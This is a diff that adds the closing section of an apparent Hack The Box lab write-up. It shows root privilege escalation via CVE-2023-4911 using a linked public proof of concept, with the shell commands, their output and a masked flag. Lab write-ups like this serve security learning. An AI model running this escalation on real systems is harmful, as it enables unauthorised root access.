@@ -159,3 +159,28 @@ I'm know you're working as fast as you can to do the DB migration. While we're p
 
 HTB Godfather
 ```
+
+Googled a bit and found out the email is referring to `CVE-2023-4911` and I used this [POC](https://github.com/NishanthAnand21/CVE-2023-4911-PoC) to get root.
+>You can use `python3 -m http.server` to send files to the victim machine.
+{: .prompt-tip }
+
+```
+admin@2million:/tmp$ python3 genlib.py 
+admin@2million:/tmp$ chmod +x titap
+admin@2million:/tmp$ ./titap
+# whoami
+root
+# id
+uid=0(root) gid=1000(admin) groups=1000(admin)
+```
+
+And the flag
+
+```
+# cd /root
+# cat root.txt 
+5b5c6****************90556050597
+```
+
+Done
+Thanks for reading!
